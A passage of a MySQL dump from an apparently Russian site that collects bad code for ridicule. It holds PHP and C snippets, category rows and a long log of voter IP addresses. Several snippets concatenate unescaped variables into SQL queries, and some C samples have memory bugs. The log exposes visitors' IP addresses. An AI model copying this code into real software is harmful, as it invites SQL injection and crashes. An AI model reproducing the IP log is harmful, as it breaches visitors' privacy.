  (346,2287,1,1231435915,1237038719,'public function rsort($flag = SORT_REGULAR) \r\n{\r\n  rsort($this->var, SORT_REGULAR);\r\n  return $this;\r\n}','','Пример сортировки массива =)',-1,0,1,0),
  (347,2293,1,1231438002,0,'function newuser($username){\r\n  return;\r\n  /*\r\n    ДВАДЦАТЬ СТРОК КОДА\r\n  */\r\n  //не пойму почему не работает:ФИО Программиста\r\n}','','наследие от предыдущих программистов проекта',17,0,1,1),
  (348,2296,1,1231486629,1231598466,'public function buildCriteria($table, $conditions)\r\n    {\r\n        $source_table = $table->getTableName();\r\n        $criteria = new criteria($source_table, ''keyword'');\r\n\r\n        foreach ($conditions as $field => $conds) {\r\n\r\n\r\n            if (is_array($conds)) {\r\n\r\n                if (isset($conds[''plus''])) {\r\n                    $word = array_shift($conds[''plus'']);\r\n                    $like_criterion = new criterion($field, ''%'' . $word . ''%'', criteria::LIKE);\r\n                    foreach ($conds[''plus''] as $word) {\r\n                        $like_criterion->addOr(new criterion($field, ''%'' . $word . ''%'', criteria::LIKE));\r\n                    }\r\n                }\r\n\r\n                if (isset($conds[''minus''])) {\r\n                    $word = array_shift($conds[''minus'']);\r\n                    $not_like_criterion = new criterion($field, ''%'' . $word . ''%'', criteria::NOT_LIKE);\r\n                    foreach ($conds[''minus''] as $word) {\r\n                        $not_like_criterion->addAnd(new criterion($field, ''%'' . $word . ''%'', criteria::NOT_LIKE));\r\n                    }\r\n                }\r\n\r\n                if (isset($conds[''less''])) {\r\n                    if (!is_array($conds[''less''])) {\r\n                        $conds[''less''] = array($conds[''less'']);\r\n                    }\r\n\r\n                    $word = array_shift($conds[''less'']);\r\n                    $less_criterion = new criterion($field, $word, criteria::LESS);\r\n\r\n                    foreach ($conds[''less''] as $word) {\r\n                        $less_criterion->addAnd(new criterion($field, $word, criteria::LESS));\r\n                    }\r\n                }\r\n\r\n                if (isset($conds[''less_eq''])) {\r\n                    if (!is_array($conds[''less_eq''])) {\r\n                        $conds[''less_eq''] = array($conds[''less_eq'']);\r\n                    }\r\n\r\n                    $word = array_shift($conds[''less_eq'']);\r\n                    $less_eq_criterion = new criterion($field, $word, criteria::LESS_EQUAL );\r\n\r\n                    foreach ($conds[''less_eq''] as $word) {\r\n                        $less_eq_criterion->addAnd(new criterion($field, $word, criteria::LESS_EQUAL));\r\n                    }\r\n                }\r\n            }\r\n        }\r\n\r\n        $main_criterion = new criterion();\r\n\r\n        if (!empty($like_criterion)) {\r\n            $main_criterion->add($like_criterion);\r\n            $add_method = ''addAnd'';\r\n        }\r\n\r\n        if (!empty($not_like_criterion)) {\r\n            if (empty($add_method)) {\r\n                $add_method = ''add'';\r\n            }\r\n            $main_criterion->$add_method($not_like_criterion);\r\n        }\r\n\r\n        if (!empty($less_criterion)) {\r\n            if (empty($add_method)) {\r\n                $add_method = ''add'';\r\n            }\r\n            $main_criterion->$add_method($less_criterion);\r\n        }\r\n\r\n        if (!empty($less_eq_criterion)) {\r\n            if (empty($add_method)) {\r\n                $add_method = ''add'';\r\n            }\r\n            $main_criterion->$add_method($less_eq_criterion);\r\n        }\r\n\r\n        $criteria->add($main_criterion);\r\n\r\n        return $criteria;\r\n\r\n    }\r\n\r\n\r\npublic function testBuildCriteria()\r\n    {\r\n        $table = new mockStubKeywordTable();\r\n        $table->setReturnValue(''getTableName'', ''test_table'');\r\n\r\n        $query = $this->keywordQuery;\r\n\r\n        $data[''field1''][''less''] = 5;\r\n        $data[''field2''][''less_eq''] = 10;\r\n/*        $data[''field2''][''greater_eq''] = 11;\r\n        $data[''field3''][''greater''] = 12;','','требуется рефакторинг',-9,0,0,1),
  (349,2298,1,1231487830,0,'<?php\r\n\r\nfunction drop_dir ( $dir_id )\r\n{\r\n\t$query\t=\tmysql_query ( \"SELECT `id` FROM `dirs` WHERE `subid`=\" . $dir_id );\r\n\twhile ( $row\t=\tmysql_fetch_array ( $query ) )\r\n\t{\r\n\t\t$n_query\t=\tmysql_query ( \"SELECT `id` FROM `dirs` WHERE `subid`=\" . $row[''id''] );\r\n\t\twhile ( $n_row\t=\tmysql_fetch_array ( $query ) )\r\n\t\t{\r\n\t\t\t$n2_query\t=\tmysql_query ( \"SELECT `id` FROM `dirs` WHERE `subid`=\" . $n_row[''id''] );\r\n\t\t\twhile ( $n2_row\t=\tmysql_fetch_array ( $n2_query ) )\r\n\t\t\t{\r\n\t\t\t\tmysql_query ( \"DELETE FROM `dirs` WHERE `id`=\" . $n2_row[''id''] );\r\n\t\t\t} // Неужто блядь кто то дальше вложит\r\n\t\t\tmysql_query ( \"DELETE FROM `dirs` WHERE `id`=\" . $n_row[''id''] );\r\n\t\t}\r\n\t\tmysql_query ( \"DELETE FROM `dirs` WHERE `id`=\" . $row[''id''] );\r\n\t}\r\n\tmysql_query ( \"DELETE FROM `dirs` WHERE `id`=\" . $dir );\r\n\tRETURN TRUE;\r\n}\r\n\r\n?>','','(c) Я, 2007',21,0,1,0),
  (350,2303,1,1231501764,0,'if (@mysql_query(\"CREATE TABLE `cms_attributes_\".$a.\"` (`element_id` int(5))\")) {}','','Реальный код..\r\nВидимо, человек любит индусов и начал им подражать)',1,0,1,0),
  (351,2305,1,1231501865,0,'// Проверяет, есть ли у страницы вложенные страницы\r\nfunction exists_sub_pages($page_id)\r\n{\r\n$select_sub_pages=mysql_query(\"select * from pages where parent=''\".$page_id.\"''\");\r\nif (mysql_num_rows($select_sub_pages)>0) {$result=1;} else {$result=0;}\r\nreturn $result;\r\n}','','Не понимаю, зачем так всё усложнять :-(',2,0,1,0),
  (352,2321,6,1231536873,0,'int main()\r\n{\r\nint i;\r\nfor(clrscr(),\r\n    printf(\"starting of stupid progam\\n\"),\r\n    i=10;\r\n    i--;\r\n    printf(\"i= %d\\n\",i));\r\nreturn 0;\r\n\r\n}','','Страшен язык Си',4,0,1,1),
  (353,2323,6,1231536938,0,'int clearscreen()\r\n{\r\nclrscr();\r\nreturn 0;\r\n}\r\nvoid main()\r\n{\r\nchar * c;\r\n\r\nprintf(\"You typed: %c\",\r\n       *c,\r\n       scanf(\"%c\",c),\r\n       printf(\"Type any simbol: \"),\r\n       clearscreen());\r\n\r\n}','','Страшен язык Си 2',9,0,1,0),
  (354,2330,1,1231575650,0,'/**\r\n     * Validate the word\r\n     *\r\n     * @see    Zend_Validate_Interface::isValid()\r\n     * @param  mixed $value\r\n     * @return boolean\r\n     */\r\n    public function isValid($value, $context = null)\r\n    {\r\n        $name = $this->getName();\r\n        if (!isset($context[$name][''input''])) {\r\n            $this->_error(self::MISSING_VALUE);\r\n            return false;\r\n        }\r\n        $value = strtolower($context[$name][''input'']);\r\n        $this->_setValue($value);\r\n\r\n        if (!isset($context[$name][''id''])) {\r\n            $this->_error(self::MISSING_ID);\r\n            return false;\r\n        }\r\n\r\n        $this->_id = $context[$name][''id''];\r\n        if ($value !== $this->getWord()) {\r\n            $this->_error(self::BAD_CAPTCHA);\r\n            return false;\r\n        }\r\n\r\n        return true;\r\n    }','','не ожидал даже от Zend Framework-а',1,1,1,0),
  (355,2339,1,1231593160,0,'function is_utf($str){\n    if(iconv(\"UTF-8\",\"UTF-8\",$str)==$str)\n        return true;\n    else\n        return false;\n}','4, 1','utf-8 или нет? :)',12,8,1,3);
COMMIT;

#
# Structure for the `quoter_quoteCategory` table : 
#

DROP TABLE IF EXISTS `quoter_quoteCategory`;

CREATE TABLE `quoter_quoteCategory` (
  `id` INTEGER(11) NOT NULL AUTO_INCREMENT,
  `obj_id` INTEGER(11) NOT NULL,
  `name` CHAR(255) COLLATE utf8_general_ci NOT NULL DEFAULT '',
  `title` CHAR(255) COLLATE utf8_general_ci NOT NULL DEFAULT '',
  `quote_counts` INTEGER(10) UNSIGNED NOT NULL,
  PRIMARY KEY (`id`)
)ENGINE=MyISAM
AUTO_INCREMENT=14 ROW_FORMAT=FIXED CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';

#
# Data for the `quoter_quoteCategory` table  (LIMIT 0,500)
#

INSERT INTO `quoter_quoteCategory` (`id`, `obj_id`, `name`, `title`, `quote_counts`) VALUES 
  (1,22,'php','PHP',95),
  (2,23,'javascript','JavaScript',12),
  (3,34,'sql','SQL',7),
  (4,35,'perl','PERL',8),
  (5,36,'python','Python',9),
  (6,738,'c','Си',13),
  (7,739,'cpp','C++',21),
  (8,740,'csharp','C#',22),
  (9,741,'java','Java',20),
  (10,749,'delphi','Delphi',11),
  (11,767,'actionscript3','ActionScript',6),
  (12,1029,'asm','Assembler',0),
  (13,1052,'vb','VisualBasic',3);
COMMIT;

#
# Structure for the `quoter_votes` table : 
#

DROP TABLE IF EXISTS `quoter_votes`;

CREATE TABLE `quoter_votes` (
  `id` INTEGER(11) NOT NULL AUTO_INCREMENT,
  `ip` VARCHAR(20) COLLATE utf8_general_ci NOT NULL DEFAULT '',
  `useragent` VARCHAR(255) COLLATE utf8_general_ci NOT NULL DEFAULT '',
  `value` TINYINT(4) NOT NULL,
  `quote_id` INTEGER(11) NOT NULL,
  `created` INTEGER(11) NOT NULL,
  PRIMARY KEY (`id`)
)ENGINE=MyISAM
AUTO_INCREMENT=11922 CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';

#
# Data for the `quoter_votes` table  (LIMIT 0,500)
#

INSERT INTO `quoter_votes` (`id`, `ip`, `useragent`, `value`, `quote_id`, `created`) VALUES 
  (1,'91.202.197.79','',0,8,1227357120),
  (2,'91.202.197.79','',0,6,1227357786),
  (3,'193.93.218.64','',0,6,1227358231),
  (4,'193.93.218.64','',0,8,1227358387),
  (5,'193.93.218.67','',0,9,1227423662),
  (6,'91.202.197.79','',0,9,1227428719),
  (7,'78.24.227.113','',0,8,1227428948),
  (8,'91.202.197.79','',0,8,1227429283),
  (9,'78.24.227.113','',0,11,1227430562),
  (10,'78.24.227.113','',0,10,1227430718),
  (11,'81.18.116.69','',0,10,1227430776),
  (12,'91.202.197.79','',0,11,1227431513),
  (13,'78.24.227.113','',0,9,1227435341),
  (14,'83.239.239.154','',0,8,1227439693),
  (15,'83.239.239.154','',0,13,1227448720),
  (16,'91.202.197.79','',0,12,1227449660),
  (17,'91.202.197.79','',0,6,1227449821),
  (18,'79.111.234.68','',0,16,1227453259),
  (19,'83.239.239.154','',0,16,1227461436),
  (20,'83.239.239.154','',0,15,1227461480),
  (21,'83.239.239.154','',0,12,1227462147),
  (22,'77.88.30.246','',0,8,1227487443),
  (23,'77.88.30.246','',0,6,1227487454),
  (24,'78.24.231.147','',0,17,1227489846),
  (25,'93.88.5.140','',0,17,1227501579),
  (26,'93.88.5.140','',0,15,1227501751),
  (27,'80.243.71.189','',0,15,1227501799),
  (28,'80.243.71.189','',0,18,1227501966),
  (29,'80.243.71.189','',0,17,1227502445),
  (30,'93.88.5.98','',0,16,1227518988),
  (31,'193.93.218.67','',0,12,1227533488),
  (32,'77.88.30.246','',0,10,1227568599),
  (33,'77.88.30.246','',0,8,1227568609),
  (34,'93.88.5.140','',0,19,1227575260),
  (35,'80.243.71.189','',0,19,1227579896),
  (36,'80.243.71.189','',0,20,1227584897),
  (37,'78.24.231.147','',0,18,1227588747),
  (38,'78.24.225.187','',0,20,1227604664),
  (39,'77.35.253.28','',0,16,1227605744),
  (40,'193.93.218.67','',0,19,1227622513),
  (41,'77.88.30.246','',0,16,1227649891),
  (42,'77.88.30.246','',0,9,1227649897),
  (43,'77.88.30.246','',0,13,1227649903),
  (44,'77.88.30.246','',0,11,1227649910),
  (45,'77.88.30.246','',0,12,1227649919),
  (46,'77.88.30.246','',0,17,1227649928),
  (47,'77.88.30.246','',0,15,1227649938),
  (48,'77.88.30.246','',0,14,1227649952),
  (49,'77.88.30.246','',0,18,1227649977),
  (50,'80.243.71.189','',0,21,1227676800),
  (51,'66.249.65.234','',0,21,1227680292),
  (52,'66.249.65.234','',0,8,1227680348),
  (53,'66.249.65.234','',0,18,1227680532),
  (54,'66.249.65.234','',0,19,1227680545),
  (55,'66.249.65.234','',0,13,1227680578),
  (56,'66.249.65.234','',0,20,1227680659),
  (57,'66.249.65.234','',0,16,1227680674),
  (58,'66.249.65.234','',0,15,1227680686),
  (59,'66.249.65.234','',0,10,1227680716),
  (60,'66.249.65.234','',0,6,1227680842),
  (61,'66.249.65.234','',0,9,1227681810),
  (62,'66.249.65.234','',0,17,1227681867),
  (63,'66.249.65.234','',0,11,1227681888),
  (64,'66.249.65.234','',0,14,1227681892),
  (65,'66.249.65.234','',0,12,1227681913),
  (66,'89.107.82.8','',0,18,1227690685),
  (67,'89.107.82.8','',0,20,1227690724),
  (68,'89.107.82.8','',0,15,1227690803),
  (69,'89.107.82.8','',0,8,1227690837),
  (70,'94.253.21.120','',0,21,1227709677),
  (71,'91.202.197.79','',0,16,1227711798),
  (72,'91.202.197.79','',0,19,1227711807),
  (73,'91.202.197.79','',0,15,1227711814),
  (74,'88.134.125.252','',0,21,1227731415),
  (75,'88.134.125.252','',0,19,1227731437),
  (76,'88.134.125.252','',0,18,1227731448),
  (77,'94.112.6.189','',0,17,1227732363),
  (78,'193.138.146.66','',0,21,1227732398),
  (79,'62.192.224.247','',0,21,1227732499),
  (80,'89.113.73.178','',0,10,1227732601),
  (81,'88.200.167.185','',0,21,1227732948),
  (82,'78.36.201.230','',0,21,1227736264),
  (83,'213.79.103.146','',0,88,1227736788),
  (84,'195.131.192.250','',0,16,1227737190),
  (85,'195.131.192.250','',0,145,1227737518),
  (86,'195.131.192.250','',0,144,1227737525),
  (87,'195.131.192.250','',0,143,1227737556),
  (88,'212.192.164.14','',0,21,1227741874),
  (89,'74.54.55.50','',0,435,1227748477),
  (90,'74.54.55.50','',0,444,1227748478),
  (91,'217.66.145.120','',0,693,1227752738),
  (92,'87.242.97.4','',0,21,1227753394),
  (93,'87.242.97.4','',0,24,1227753415),
  (94,'87.242.97.4','',0,17,1227753428),
  (95,'87.242.97.4','',0,13,1227753441),
  (96,'87.242.97.4','',0,12,1227753546),
  (97,'77.88.30.246','',0,19,1227754018),
  (98,'77.88.30.246','',0,20,1227754031),
  (99,'77.88.30.246','',0,21,1227754033),
  (100,'88.147.212.141','',0,6,1227756660),
  (101,'89.109.141.244','',0,21,1227757271),
  (102,'91.76.54.67','',0,15,1227759007),
  (103,'91.76.54.67','',0,699,1227759259),
  (104,'217.79.16.60','',0,699,1227761289),
  (105,'195.98.50.58','',0,24,1227762019),
  (106,'195.151.223.253','',0,24,1227762042),
  (107,'91.199.67.131','',0,699,1227764851),
  (108,'217.172.29.12','',0,13,1227766804),
  (109,'217.23.25.10','',0,19,1227767495),
  (110,'92.242.6.146','',0,19,1227767556),
  (111,'212.49.121.7','',0,700,1227771033),
  (112,'81.3.153.102','',0,6,1227771646),
  (113,'217.113.122.50','',0,24,1227771748),
  (114,'213.169.66.205','',0,22,1227771785),
  (115,'217.113.122.50','',0,21,1227771798),
  (116,'81.200.211.90','',0,700,1227772050),
  (117,'81.200.211.90','',0,699,1227772081),
  (118,'81.200.211.90','',0,701,1227772089),
  (119,'81.200.211.90','',0,24,1227772103),
  (120,'81.200.211.90','',0,18,1227772147),
  (121,'81.200.211.90','',0,21,1227772189),
  (122,'81.200.211.90','',0,17,1227773916),
  (123,'81.200.211.90','',0,15,1227773928),
  (124,'89.107.82.210','',0,701,1227775273),
  (125,'89.107.82.210','',0,18,1227775430),
  (126,'89.107.82.210','',0,19,1227775433),
  (127,'89.107.82.210','',0,20,1227775435),
  (128,'89.107.82.210','',0,21,1227775437),
  (129,'89.107.82.210','',0,22,1227775438),
  (130,'89.107.82.210','',0,24,1227775442),
  (131,'89.107.82.210','',0,23,1227775442),
  (132,'89.107.82.210','',0,699,1227775444),
  (133,'89.107.82.210','',0,700,1227775445),
  (134,'213.130.27.213','',0,24,1227775564),
  (135,'80.64.89.64','',0,21,1227775792),
  (136,'89.112.88.226','',0,699,1227775907),
  (137,'195.5.154.130','',0,700,1227779570),
  (138,'195.5.154.130','',0,22,1227779722),
  (139,'195.5.154.130','',0,15,1227779934),
  (140,'217.79.16.60','',0,699,1227784788),
  (141,'217.79.16.60','',0,23,1227784804),
  (142,'217.79.16.60','',0,21,1227784813),
  (143,'195.190.109.114','',0,699,1227785100),
  (144,'213.79.103.146','',0,703,1227786410),
  (145,'193.93.218.67','',0,699,1227787048),
  (146,'91.202.197.79','',0,8,1227790469),
  (147,'91.202.197.79','',0,5,1227791752),
  (148,'91.202.197.79','',0,13,1227791755),
  (149,'217.113.122.50','',0,16,1227792845),
  (150,'88.81.229.42','',0,19,1227793510),
  (151,'89.218.165.26','',0,19,1227798357),
  (152,'81.18.116.69','',0,3,1227798857),
  (153,'91.202.197.79','',0,21,1227799217),
  (154,'77.120.128.75','',0,21,1227799221),
  (155,'83.174.244.85','',0,14,1227799976),
  (156,'91.202.197.79','',0,22,1227800068),
  (157,'91.208.153.1','',0,4,1227800386),
  (158,'91.208.153.1','',0,17,1227800414),
  (159,'91.208.153.1','',0,10,1227800427),
  (160,'91.208.153.1','',0,20,1227800438),
  (161,'80.73.0.127','',0,18,1227800446),
  (162,'80.73.0.127','',0,5,1227800916),
  (163,'80.254.54.101','',0,19,1227801040),
  (164,'84.17.11.132','',0,23,1227801626),
  (165,'92.47.234.78','',0,18,1227802019),
  (166,'213.252.97.185','',0,20,1227802489),
  (167,'213.252.97.185','',0,17,1227802496),
  (168,'213.252.97.185','',0,23,1227802505),
  (169,'213.252.97.185','',0,22,1227802511),
  (170,'92.244.234.47','',0,12,1227803566),
  (171,'217.30.244.199','',0,23,1227804439),
  (172,'217.30.244.199','',0,18,1227804548),
  (173,'217.30.244.199','',0,20,1227804588),
  (174,'195.112.96.44','',0,1,1227804606),
  (175,'87.225.50.19','',0,16,1227805010),
  (176,'87.225.50.19','',0,19,1227805012),
  (177,'87.225.50.19','',0,21,1227805028),
  (178,'195.190.115.154','',0,20,1227805184),
  (179,'87.117.13.235','',0,19,1227805754),
  (180,'78.37.146.36','',0,19,1227806541),
  (181,'89.179.247.85','',0,15,1227806934),
  (182,'195.214.232.10','',0,16,1227807220),
  (183,'195.214.232.10','',0,19,1227807280),
  (184,'195.214.232.10','',0,12,1227807334),
  (185,'94.51.0.12','',0,16,1227811918),
  (186,'217.10.38.50','',0,20,1227812487),
  (187,'90.151.85.48','',0,20,1227812776),
  (188,'90.151.85.48','',0,8,1227812857),
  (189,'80.73.0.127','',0,25,1227812884),
  (190,'79.111.114.36','',0,19,1227812891),
  (191,'90.151.85.48','',0,6,1227812934),
  (192,'80.73.0.127','',0,18,1227812990),
  (193,'80.73.0.127','',0,17,1227812998),
  (194,'80.73.0.127','',0,5,1227813007),
  (195,'80.73.0.127','',0,11,1227813121),
  (196,'80.73.0.127','',0,10,1227813133),
  (197,'80.73.0.127','',0,6,1227813243),
  (198,'80.73.0.127','',0,2,1227813267),
  (199,'80.73.0.127','',0,1,1227813281),
  (200,'80.73.0.127','',0,7,1227813317),
  (201,'87.119.226.93','',0,20,1227815934),
  (202,'213.21.25.144','',0,16,1227817305),
  (203,'92.101.30.54','',0,24,1227817347),
  (204,'77.88.30.246','',0,25,1227821027),
  (205,'77.88.30.246','',0,22,1227821030),
  (206,'77.88.30.246','',0,26,1227821039),
  (207,'77.88.30.246','',0,23,1227821047),
  (208,'77.88.30.246','',0,24,1227821052),
  (209,'80.73.0.127','',0,18,1227824057),
  (210,'80.73.0.127','',0,25,1227824063),
  (211,'80.73.0.127','',0,20,1227824147),
  (212,'80.73.0.127','',0,5,1227824160),
  (213,'80.73.0.127','',0,13,1227824485),
  (214,'80.73.0.127','',0,11,1227824494),
  (215,'80.73.0.127','',0,10,1227824502),
  (216,'80.73.0.127','',0,8,1227824543),
  (217,'80.73.0.127','',0,2,1227824579),
  (218,'80.73.0.127','',0,26,1227824711),
  (219,'80.73.0.127','',0,3,1227824848),
  (220,'80.73.0.127','',0,24,1227824943),
  (221,'80.73.0.127','',0,23,1227825056),
  (222,'80.73.0.127','',0,22,1227825568),
  (223,'80.73.0.127','',0,12,1227825644),
  (224,'80.73.0.127','',0,16,1227825679),
  (225,'80.73.0.127','',0,19,1227825711),
  (226,'77.120.129.234','',0,21,1227825982),
  (227,'80.243.71.189','',0,23,1227838297),
  (228,'67.202.43.229','',0,10,1227844648),
  (229,'83.149.3.55','',0,24,1227845601),
  (230,'78.24.231.147','',0,27,1227847969),
  (231,'80.243.71.189','',0,25,1227852087),
  (232,'80.243.71.189','',0,22,1227852101),
  (233,'80.243.71.189','',0,21,1227852105),
  (234,'80.243.71.189','',0,18,1227852113),
  (235,'67.202.43.229','',0,19,1227854457),
  (236,'67.202.43.229','',0,20,1227854467),
  (237,'67.202.43.229','',0,21,1227854478),
  (238,'67.202.43.229','',0,22,1227854488),
  (239,'67.202.43.229','',0,23,1227854497),
  (240,'217.113.122.50','',0,21,1227856229),
  (241,'217.113.122.50','',0,28,1227856243),
  (242,'217.113.122.50','',0,19,1227856249),
  (243,'217.113.122.50','',0,16,1227856255),
  (244,'212.74.241.18','',0,17,1227856310),
  (245,'91.192.82.115','',0,16,1227856318),
  (246,'80.243.71.189','',0,28,1227856523),
  (247,'85.114.2.238','',0,24,1227862705),
  (248,'85.114.2.227','',0,24,1227862889),
  (249,'78.24.227.79','',0,27,1227863088),
  (250,'84.17.11.132','',0,23,1227865105),
  (251,'194.44.62.149','',0,23,1227865220),
  (252,'194.44.62.149','',0,22,1227865249),
  (253,'84.17.11.132','',0,20,1227865275),
  (254,'84.17.11.132','',0,22,1227865281),
  (255,'84.17.11.132','',0,13,1227865284),
  (256,'194.44.62.149','',0,24,1227865303),
  (257,'84.17.11.132','',0,28,1227865769),
  (258,'80.82.44.194','',0,28,1227871146),
  (259,'195.234.72.66','',0,21,1227872394),
  (260,'193.93.218.64','',0,29,1227873036),
  (261,'94.51.3.99','',0,29,1227875730),
  (262,'91.124.43.134','',0,4,1227877779),
  (263,'82.116.32.75','',0,28,1227877828),
  (264,'82.116.32.75','',0,29,1227878116),
  (265,'82.116.32.75','',0,21,1227878123),
  (266,'87.119.236.144','',0,27,1227879046),
  (267,'77.35.17.2','',0,13,1227880032),
  (268,'77.35.17.2','',0,14,1227880038),
  (269,'77.35.17.2','',0,11,1227880050),
  (270,'77.94.211.133','',0,24,1227881104),
  (271,'77.94.211.133','',0,23,1227881139),
  (272,'77.94.211.133','',0,21,1227881213),
  (273,'77.94.211.133','',0,18,1227881259),
  (274,'77.50.62.137','',0,29,1227882170),
  (275,'91.196.95.17','',0,19,1227882699),
  (276,'91.124.208.227','',0,12,1227882705),
  (277,'91.196.95.17','',0,16,1227882717),
  (278,'212.56.210.18','',0,20,1227882768),
  (279,'212.56.210.18','',0,21,1227883119),
  (280,'94.248.4.206','',0,21,1227883657),
  (281,'94.253.36.238','',0,7,1227885224),
  (282,'217.117.64.2','',0,21,1227885900),
  (283,'91.187.0.109','',0,19,1227887436),
  (284,'62.231.16.21','',0,16,1227889570),
  (285,'91.202.197.79','',0,29,1227891347),
  (286,'83.172.48.41','',0,18,1227891676),
  (287,'85.234.62.83','',0,27,1227891878),
  (288,'85.234.62.83','',0,28,1227891891),
  (289,'85.234.62.83','',0,29,1227891934),
  (290,'85.234.62.83','',0,21,1227891981),
  (291,'85.234.62.83','',0,16,1227892027),
  (292,'85.234.62.83','',0,19,1227892060),
  (293,'85.234.62.83','',0,18,1227892113),
  (294,'85.234.62.83','',0,17,1227892114),
  (295,'85.234.62.83','',0,20,1227892129),
  (296,'85.234.62.83','',0,5,1227892188),
  (297,'94.253.21.72','',0,29,1227892255),
  (298,'85.234.62.83','',0,11,1227892265),
  (299,'85.234.62.83','',0,10,1227892287),
  (300,'85.234.62.83','',0,13,1227892346),
  (301,'85.21.88.2','',0,31,1227895376),
  (302,'85.21.88.2','',0,32,1227895378),
  (303,'85.21.88.2','',0,33,1227895382),
  (304,'85.21.88.2','',0,34,1227895389),
  (305,'79.165.45.16','',0,32,1227901920),
  (306,'79.165.45.16','',0,33,1227901923),
  (307,'79.165.45.16','',0,34,1227901927),
  (308,'79.165.45.16','',0,31,1227901929),
  (309,'89.113.148.126','',0,27,1227904230),
  (310,'91.124.67.194','',0,34,1227908052),
  (311,'91.124.67.194','',0,33,1227908054),
  (312,'91.124.67.194','',0,32,1227908068),
  (313,'91.124.67.194','',0,31,1227908071),
  (314,'208.43.110.50','',0,36,1227914093),
  (315,'80.73.0.127','',0,29,1227925020),
  (316,'80.73.0.127','',0,5,1227925049),
  (317,'78.24.227.242','',0,30,1227927504),
  (318,'78.24.227.242','',0,29,1227927536),
  (319,'91.202.197.79','',0,30,1227938950),
  (320,'93.88.5.140','',0,19,1227939003),
  (321,'91.202.197.79','',0,25,1227941443),
  (322,'78.24.227.242','',0,30,1227941465),
  (323,'78.24.227.242','',0,29,1227941470),
  (324,'78.24.227.242','',0,21,1227941535),
  (325,'78.24.227.242','',0,18,1227941721),
  (326,'78.24.227.242','',0,17,1227941727),
  (327,'78.24.227.242','',0,5,1227941779),
  (328,'78.24.227.242','',0,13,1227941789),
  (329,'78.24.227.242','',0,11,1227941793),
  (330,'78.24.227.242','',0,10,1227941797),
  (331,'78.24.227.242','',0,9,1227941804),
  (332,'78.24.227.242','',0,8,1227941817),
  (333,'78.24.227.242','',0,7,1227941818),
  (334,'78.24.227.242','',0,6,1227941826),
  (335,'78.24.227.242','',0,2,1227941843),
  (336,'78.24.227.242','',0,4,1227941844),
  (337,'78.24.227.242','',0,1,1227941856),
  (338,'91.202.197.79','',0,21,1227946201),
  (339,'79.111.232.72','',0,29,1227956688),
  (340,'91.202.197.79','',0,29,1227957283),
  (341,'91.202.197.79','',0,30,1227957289),
  (342,'89.107.82.107','',0,30,1227957345),
  (343,'89.107.82.107','',0,29,1227957351),
  (344,'89.107.82.107','',0,21,1227957362),
  (345,'83.149.3.55','',0,38,1227959716),
  (346,'91.202.197.79','',0,38,1227959777),
  (347,'91.202.197.79','',0,29,1227966015),
  (348,'91.202.197.79','',0,25,1227966043),
  (349,'77.50.62.137','',0,38,1227974856),
  (350,'80.73.0.127','',0,18,1227980949),
  (351,'80.73.0.127','',0,25,1227980956),
  (352,'80.73.0.127','',0,5,1227980970),
  (353,'77.120.218.76','',0,38,1227991134),
  (354,'80.73.0.127','',0,25,1228002462),
  (355,'91.78.132.111','',0,29,1228007195),
  (356,'91.78.132.111','',0,30,1228007252),
  (357,'78.24.227.235','',0,38,1228007887),
  (358,'91.202.197.79','',0,30,1228009194),
  (359,'91.202.197.79','',0,38,1228009700),
  (360,'91.202.197.79','',0,29,1228009708),
  (361,'81.18.116.69','',0,39,1228029668),
  (362,'89.251.107.20','',0,39,1228031882),
  (363,'89.109.229.79','',0,39,1228036125),
  (364,'94.253.32.59','',0,39,1228047057),
  (365,'94.253.32.59','',0,7,1228047213),
  (366,'94.253.32.59','',0,3,1228047271),
  (367,'193.93.218.64','',0,39,1228050560),
  (368,'80.73.0.127','',0,25,1228053397),
  (369,'80.73.0.127','',0,39,1228053418),
  (370,'80.86.245.139','',0,39,1228054813),
  (371,'80.86.245.139','',0,38,1228054876),
  (372,'193.35.25.2','',0,39,1228055099),
  (373,'92.245.43.80','',0,39,1228055797),
  (374,'92.245.43.80','',0,25,1228055866),
  (375,'80.73.0.127','',0,5,1228056241),
  (376,'80.73.0.127','',0,27,1228056493),
  (377,'80.73.0.127','',0,21,1228056622),
  (378,'80.73.0.127','',0,30,1228056650),
  (379,'89.190.244.98','',0,2,1228057153),
  (380,'89.190.244.98','',0,1,1228057155),
  (381,'83.237.189.80','',0,19,1228058790),
  (382,'83.237.189.80','',0,29,1228058888),
  (383,'83.237.189.80','',0,28,1228058904),
  (384,'66.249.72.112','',0,24,1228058968),
  (385,'66.249.72.112','',0,23,1228059118),
  (386,'66.249.72.112','',0,29,1228059157),
  (387,'66.249.72.112','',0,25,1228059406),
  (388,'66.249.72.112','',0,13,1228059430),
  (389,'66.249.72.112','',0,38,1228059451),
  (390,'66.249.72.112','',0,27,1228059863),
  (391,'66.249.72.112','',0,39,1228059867),
  (392,'66.249.72.112','',0,26,1228059879),
  (393,'66.249.72.112','',0,28,1228061393),
  (394,'66.249.72.112','',0,30,1228062140),
  (395,'193.151.12.70','',0,39,1228062705),
  (396,'93.80.101.115','',0,29,1228064683),
  (397,'78.106.71.140','',0,24,1228069641),
  (398,'91.195.130.12','',0,39,1228070911),
  (399,'83.234.227.12','',0,1,1228072187),
  (400,'93.120.171.187','',0,39,1228073310),
  (401,'66.249.72.112','',0,21,1228075943),
  (402,'77.88.30.246','',0,20,1228076213),
  (403,'77.88.30.246','',0,10,1228076224),
  (404,'77.88.30.246','',0,6,1228076229),
  (405,'77.88.30.246','',0,3,1228076249),
  (406,'77.88.30.246','',0,2,1228076254),
  (407,'77.88.30.246','',0,38,1228076259),
  (408,'77.88.30.246','',0,12,1228076261),
  (409,'77.88.30.246','',0,30,1228076271),
  (410,'77.88.30.246','',0,26,1228076281),
  (411,'77.88.30.246','',0,27,1228076291),
  (412,'77.88.30.246','',0,7,1228076297),
  (413,'77.88.30.246','',0,21,1228076303),
  (414,'77.88.30.246','',0,8,1228076310),
  (415,'77.88.30.246','',0,18,1228076318),
  (416,'77.88.30.246','',0,15,1228076320),
  (417,'77.88.30.246','',0,28,1228076343),
  (418,'77.88.30.246','',0,25,1228076348),
  (419,'77.88.30.246','',0,17,1228076353),
  (420,'77.88.30.246','',0,22,1228076356),
  (421,'77.88.30.246','',0,1,1228076361),
  (422,'77.88.30.246','',0,29,1228076371),
  (423,'77.88.30.246','',0,9,1228076376),
  (424,'77.88.30.246','',0,4,1228076391),
  (425,'77.88.30.246','',0,23,1228076404),
  (426,'77.88.30.246','',0,24,1228076412),
  (427,'77.88.30.246','',0,5,1228076437),
  (428,'77.88.30.246','',0,13,1228076446),
